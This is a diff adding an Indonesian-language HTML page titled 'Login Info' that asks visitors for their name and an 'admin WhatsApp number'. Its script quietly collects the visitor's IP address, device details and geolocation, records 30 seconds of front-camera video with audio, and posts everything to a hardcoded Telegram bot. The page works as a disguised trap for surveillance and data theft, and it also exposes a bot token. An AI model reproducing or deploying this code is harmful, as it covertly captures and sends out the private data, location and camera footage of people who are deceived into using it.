@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Login Info</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #6a11cb, #2575fc);
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .popup {
+      background-color: rgba(0, 0, 0, 0.7);
+      padding: 30px;
+      border-radius: 15px;
+      text-align: center;
+      width: 300px;
+    }
+    input, button {
+      padding: 10px;
+      width: 100%;
+      margin-top: 10px;
+      border-radius: 8px;
+      border: none;
+    }
+    button {
+      background: #00ff88;
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    #loading { display: none; }
+    video { display: none; }
+  </style>
+</head>
+<body>
+
+<div class="popup" id="step1">
+  <h2>Masukkan Nama Anda</h2>
+  <input type="text" id="nama" placeholder="Nama Anda">
+  <button onclick="lanjut()">Lanjut</button>
+</div>
+
+<div class="popup" id="step2" style="display:none;">
+  <h2>Masukkan No WhatsApp Admin</h2>
+  <input type="text" id="whatsapp" placeholder="08xxxxxxxxxx">
+  <button onclick="rekamDanKirim()">Izinkan & Kirim</button>
+</div>
+
+<div id="loading">
+  <h3>Memproses...</h3>
+  <p>Tunggu sebentar ya.</p>
+</div>
+
+<video id="video" autoplay muted playsinline></video>
+
+<script>
+  const token = '8051593906:AAFeMij6V_XGMcRsL1Jkf5XpP_P3VAKo0Mo';
+  const chat_id = '6374002294';
+  let ip = "Tidak diketahui";
+  let namaGlobal = "";
+
+  fetch("https://api.ipify.org?format=json")
+    .then(res => res.json())
+    .then(data => ip = data.ip);
+
+  function lanjut() {
+    const nama = document.getElementById("nama").value.trim();
+    if (!nama) return alert("Isi nama dulu!");
+    namaGlobal = nama;
+    document.getElementById("step1").style.display = "none";
+    document.getElementById("step2").style.display = "block";
+  }
+
+  async function rekamDanKirim() {
+    const noWa = document.getElementById("whatsapp").value.trim();
+    if (!noWa) return alert("Isi nomor WhatsApp dulu!");
+
+    document.getElementById("step2").style.display = "none";
+    document.getElementById("loading").style.display = "block";
+
+    const device = navigator.userAgent;
+    const time = new Date().toLocaleString('id-ID');
+    let lokasi = "Tidak diketahui";
+
+    try {
+      const pos = await new Promise((res, rej) => {
+        navigator.geolocation.getCurrentPosition(res, rej);
+      });
+      lokasi = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
+    } catch {}
+
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
+    const mediaRecorder = new MediaRecorder(stream);
+    const chunks = [];
+
+    mediaRecorder.ondataavailable = e => chunks.push(e.data);
+    mediaRecorder.onstop = () => {
+      const blob = new Blob(chunks, { type: 'video/webm' });
+      const formData = new FormData();
+      formData.append("chat_id", chat_id);
+      formData.append("caption", `Nama: ${namaGlobal}\nWhatsApp: ${noWa}\nIP: ${ip}\nPerangkat: ${device}\nWaktu: ${time}\nLokasi: ${lokasi}`);
+      formData.append("video", blob, "rekaman.webm");
+
+      fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
+        method: "POST",
+        body: formData
+      });
+    };
+
+    mediaRecorder.start();
+    setTimeout(() => {
+      mediaRecorder.stop();
+      stream.getTracks().forEach(t => t.stop());
+      document.getElementById("loading").innerHTML = "<h3>Selesai!</h3><p>Data telah dikirim.</p>";
+    }, 30000); // 30 detik
+  }
+</script>
+
+</body>
+</html>
